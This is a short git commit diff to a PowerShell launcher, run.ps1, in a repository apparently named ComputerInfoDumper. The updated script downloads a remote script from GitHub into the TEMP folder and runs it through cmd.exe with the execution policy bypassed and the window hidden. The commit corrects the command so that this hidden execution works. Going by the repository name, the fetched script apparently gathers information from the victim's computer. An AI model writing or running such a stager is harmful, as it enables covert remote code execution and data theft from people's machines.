ed030ff41947477cc10fcae1c69836b1b8399fec
Dazd <87366355+dazd-pkz@users.noreply.github.com>
2023-09-16 15:41:38 +0200

    Update run.ps1

--- run.ps1
+++ run.ps1
@@ -1,2 +1,2 @@
 iwr -useb "https://raw.githubusercontent.com/dazd-pkz/ComputerInfoDumper/main/ssg-008.ps1" -o $env:TEMP\script.ps1
-saps cmd.exe "$env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe -executionpolicy bypass $env:TEMP\script.ps1" -WindowStyle Hidden
+saps cmd.exe " /c $env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe -executionpolicy bypass $env:TEMP\script.ps1" -WindowStyle Hidden
